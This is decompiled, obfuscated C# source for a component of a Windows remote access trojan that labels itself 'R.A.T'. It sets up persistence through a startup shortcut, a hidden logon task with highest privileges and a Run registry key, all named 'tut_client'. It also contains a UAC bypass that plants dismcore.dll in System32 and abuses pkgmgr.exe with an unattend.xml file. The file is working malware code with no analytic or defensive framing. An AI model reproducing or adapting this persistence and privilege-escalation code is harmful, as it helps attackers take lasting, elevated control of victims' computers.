using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

public class GClass1
{
	public enum GEnum0
	{
		StartUpFolder,
		Registry,
		TaskScheduler
	}

	[CompilerGenerated]
	private static class Class4
	{
		public static CallSite<Func<CallSite, object, GInterface4>> callSite_0;
	}

	private void method_0(string string_0, string string_1)
	{
		try
		{
			GInterface3 gInterface = (GInterface3)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B")));
			GInterface4 obj = (GInterface4)(dynamic)gInterface.imethod_0(string_0);
			obj.String_1 = string_1;
			obj.String_2 = Application.get_StartupPath();
			obj.imethod_0();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error creating shortcut: " + ex.Message);
		}
	}

	public void method_1(GEnum0 genum0_0)
	{
		switch (genum0_0)
		{
		case GEnum0.StartUpFolder:
		{
			string string_ = GClass1.smethod_1(GClass1.smethod_0(Environment.SpecialFolder.Startup), "\\client.lnk");
			if (!GClass1.smethod_2(string_))
			{
				method_0(string_, GClass1.smethod_3());
			}
			break;
		}
		case GEnum0.TaskScheduler:
			if (method_2())
			{
				Process process_ = GClass1.smethod_10();
				Process process_2 = GClass1.smethod_10();
				GClass1.smethod_12(GClass1.smethod_11(process_), "cmd.exe");
				GClass1.smethod_13(GClass1.smethod_11(process_), "/c schtasks /Delete tut_client /F");
				GClass1.smethod_14(GClass1.smethod_11(process_), ProcessWindowStyle.Hidden);
				GClass1.smethod_15(process_);
				GClass1.smethod_16(process_);
				GClass1.smethod_12(GClass1.smethod_11(process_2), "cmd.exe");
				GClass1.smethod_13(GClass1.smethod_11(process_2), GClass1.smethod_17("/c schtasks /Create /tn tut_client /tr \"", GClass1.smethod_3(), "\" /sc ONLOGON /rl HIGHEST"));
				GClass1.smethod_15(process_2);
				GClass1.smethod_16(process_2);
			}
			else
			{
				Class2.smethod_15(Class2.Enum1.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
			}
			break;
		case GEnum0.Registry:
			if (method_2())
			{
				RegistryKey registryKey_ = GClass1.smethod_4(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", bool_0: true);
				if (GClass1.smethod_5(registryKey_, "tut_client") != null)
				{
					GClass1.smethod_6(registryKey_, "tut_client", bool_0: false);
				}
				GClass1.smethod_7(registryKey_, "tut_client", (object)GClass1.smethod_3());
				GClass1.smethod_8(registryKey_);
				GClass1.smethod_9(registryKey_);
				registryKey_ = null;
			}
			else
			{
				Class2.smethod_15(Class2.Enum1.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
			}
			break;
		}
	}

	public bool method_2()
	{
		return GClass1.smethod_20(GClass1.smethod_19(GClass1.smethod_18()), WindowsBuiltInRole.Administrator);
	}

	private bool method_3()
	{
		return GClass1.smethod_21();
	}

	private void method_4()
	{
		GClass1.smethod_23(GClass1.smethod_22());
	}

	public bool method_5()
	{
		if (GClass1.smethod_2("dismcore.dll") && GClass1.smethod_2("copyFile.exe") && GClass1.smethod_2("unattend.xml") && GClass1.smethod_2("launch.exe"))
		{
			ProcessStartInfo processStartInfo = GClass1.smethod_24();
			GClass1.smethod_12(processStartInfo, GClass1.smethod_1(GClass1.smethod_25(), "\\copyFile.exe"));
			GClass1.smethod_13(processStartInfo, GClass1.smethod_17("\"", GClass1.smethod_25(), "\\dismcore.dll\" C:\\Windows\\System32"));
			GClass1.smethod_14(processStartInfo, ProcessWindowStyle.Hidden);
			ProcessStartInfo processStartInfo_ = processStartInfo;
			Process process_ = GClass1.smethod_10();
			GClass1.smethod_26(process_, processStartInfo_);
			GClass1.smethod_15(process_);
			GClass1.smethod_27("Waiting for elevated copy to finish");
			GClass1.smethod_16(process_);
			if (GClass1.smethod_28(process_) != 0)
			{
				GClass1.smethod_27("Error during elevated copy");
			}
			string string_ = GClass1.smethod_1(GClass1.smethod_0(Environment.SpecialFolder.LocalApplicationData), "\\Temp\\clientlocationx12.txt");
			if (!GClass1.smethod_2(string_))
			{
				GClass1.smethod_30((Stream)GClass1.smethod_29(string_));
			}
			GClass1.smethod_31(string_, GClass1.smethod_25());
			ProcessStartInfo processStartInfo2 = GClass1.smethod_24();
			GClass1.smethod_12(processStartInfo2, GClass1.smethod_1(GClass1.smethod_25(), "\\launch.exe"));
			GClass1.smethod_13(processStartInfo2, GClass1.smethod_17("C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"", GClass1.smethod_25(), "\\unattend.xml\"\""));
			GClass1.smethod_14(processStartInfo2, ProcessWindowStyle.Hidden);
			processStartInfo_ = processStartInfo2;
			Process process_2 = GClass1.smethod_10();
			GClass1.smethod_26(process_2, processStartInfo_);
			GClass1.smethod_15(process_2);
			GClass1.smethod_27("Waiting for bypass process to finish");
			GClass1.smethod_16(process_2);
			GClass1.smethod_27("Bypass completed");
			return true;
		}
		Class2.smethod_15(Class2.Enum1.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found");
		return false;
	}

	static string smethod_0(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string smethod_1(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static bool smethod_2(string string_0)
	{
		return File.Exists(string_0);
	}

	static string smethod_3()
	{
		return Application.get_ExecutablePath();
	}

	static RegistryKey smethod_4(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static object smethod_5(RegistryKey registryKey_0, string string_0)
	{
		return registryKey_0.GetValue(string_0);
	}

	static void smethod_6(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		registryKey_0.DeleteValue(string_0, bool_0);
	}

	static void smethod_7(RegistryKey registryKey_0, string string_0, object object_0)
	{
		registryKey_0.SetValue(string_0, object_0);
	}

	static void smethod_8(RegistryKey registryKey_0)
	{
		registryKey_0.Close();
	}

	static void smethod_9(RegistryKey registryKey_0)
	{
		registryKey_0.Dispose();
	}

	static Process smethod_10()
	{
		return new Process();
	}

	static ProcessStartInfo smethod_11(Process process_0)
	{
		return process_0.StartInfo;
	}

	static void smethod_12(ProcessStartInfo processStartInfo_0, string string_0)
	{
		processStartInfo_0.FileName = string_0;
	}

	static void smethod_13(ProcessStartInfo processStartInfo_0, string string_0)
	{
		processStartInfo_0.Arguments = string_0;
	}

	static void smethod_14(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0)
	{
		processStartInfo_0.WindowStyle = processWindowStyle_0;
	}

	static bool smethod_15(Process process_0)
	{
		return process_0.Start();
	}

	static void smethod_16(Process process_0)
	{
		process_0.WaitForExit();
	}

	static string smethod_17(string string_0, string string_1, string string_2)
	{
		return string_0 + string_1 + string_2;
	}

	static WindowsIdentity smethod_18()
	{
		return WindowsIdentity.GetCurrent();
	}

	static WindowsPrincipal smethod_19(WindowsIdentity windowsIdentity_0)
	{
		return new WindowsPrincipal(windowsIdentity_0);
	}

	static bool smethod_20(WindowsPrincipal windowsPrincipal_0, WindowsBuiltInRole windowsBuiltInRole_0)
	{
		return windowsPrincipal_0.IsInRole(windowsBuiltInRole_0);
	}

	static bool smethod_21()
	{
		return Environment.Is64BitOperatingSystem;
	}

	static Process smethod_22()
	{
		return Process.GetCurrentProcess();
	}

	static void smethod_23(Process process_0)
	{
		process_0.Kill();
	}

	static ProcessStartInfo smethod_24()
	{
		return new ProcessStartInfo();
	}

	static string smethod_25()
	{
		return Application.get_StartupPath();
	}

	static void smethod_26(Process process_0, ProcessStartInfo processStartInfo_0)
	{
		process_0.StartInfo = processStartInfo_0;
	}

	static void smethod_27(string string_0)
	{
		Console.WriteLine(string_0);
	}

	static int smethod_28(Process process_0)
	{
		return process_0.ExitCode;
	}

	static FileStream smethod_29(string string_0)
	{
		return File.Create(string_0);
	}

	static void smethod_30(Stream stream_0)
	{
		stream_0.Close();
	}

	static void smethod_31(string string_0, string string_1)
	{
		File.WriteAllText(string_0, string_1);
	}
}
